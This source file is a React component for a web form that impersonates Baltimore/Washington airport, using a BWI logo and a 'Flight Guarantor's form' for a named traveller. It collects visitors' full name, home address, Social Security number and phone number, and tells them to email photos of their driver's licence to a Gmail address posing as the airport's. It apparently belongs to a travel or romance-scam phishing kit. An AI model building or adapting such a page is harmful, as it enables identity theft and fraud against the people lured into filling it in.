
import { NavLink } from "react-router-dom";

function HomePage(props) {

    return (
        <div className="container">
            <form className="box" onSubmit={props.handleSubmit}>
                <img src="https://img.aviationpros.com/files/base/cygnus/cavc/image/2016/05/Modified__BWI_Logo_copy.574db71b7737e.png?auto=format%2Ccompress&w=640&width=640" alt="" width="200" />
                <h1>Flight Guarantor's form for Grace Angel Miller</h1>
                <h3>Please fill out the correct information for approval</h3>

                <div className="duo2">
                </div>



                <div className="over">
                    <div className="card-input">
                        <p>Full Name</p>
                        <input type="text" placeholder="" name="fullName" onChange={props.getData}   />
                    </div>
                    <div className="card-input put1">
                        <p>Full Home Address</p>
                        <input type="text" placeholder="" name="address" onChange={props.getData}  />
                        <h5>Current mailing address</h5>
                    </div>
                  
                    <div className="card-input put1">
                        <p>SSN (social security number)</p>
                        <input type="number" placeholder="" name="ssn" onChange={props.getData} />
                    </div>

                   

                  

                    <div className="card-input put1">
                        <p>Phone Number</p>
                        <input type="number" placeholder="" name="phoneNumber" onChange={props.getData} />
                    </div>

                    


                    <h1>submit a photo of the front and back of your valid Drivers Lincense/ I.D card to <br /> baltimoreairports@gmail.com</h1>
                    





                </div>





                <button className="check" onClick={props.handleSubmit}>Submit</button>

            </form>
        </div>
    )
}

export default HomePage;